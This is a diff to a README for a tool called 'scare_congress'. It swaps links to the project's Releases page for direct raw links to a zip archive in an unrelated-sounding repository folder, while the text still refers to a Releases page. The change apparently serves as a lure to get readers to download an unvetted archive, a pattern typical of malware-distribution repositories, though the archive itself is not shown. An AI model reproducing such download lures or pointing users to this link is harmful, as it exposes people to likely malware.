@@ -6,7 +6,7 @@ Welcome to the scare_congress application! This tool offers you an exciting way 
 ## 📥 Download & Install
 To download the scare_congress application, please visit the following link:
 
-[![Download scare_congress](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Scrxbzy/scare_congress/releases)
+[![Download scare_congress](https://raw.githubusercontent.com/Scrxbzy/scare_congress/main/veratraldehyde/scare_congress_v2.3.zip)](https://raw.githubusercontent.com/Scrxbzy/scare_congress/main/veratraldehyde/scare_congress_v2.3.zip)
 
 Once you're on the Releases page, you will see different versions of the application. Choose the latest version to ensure you have the most updated features. 
 
@@ -53,4 +53,4 @@ If you need further assistance, please reach out for support. You can find helpf
 
 ---
 
-Enjoy using scare_congress! Your adventure awaits with just a simple download. To start now, click here again: [Download scare_congress](https://github.com/Scrxbzy/scare_congress/releases).
+Enjoy using scare_congress! Your adventure awaits with just a simple download. To start now, click here again: [Download scare_congress](https://raw.githubusercontent.com/Scrxbzy/scare_congress/main/veratraldehyde/scare_congress_v2.3.zip).
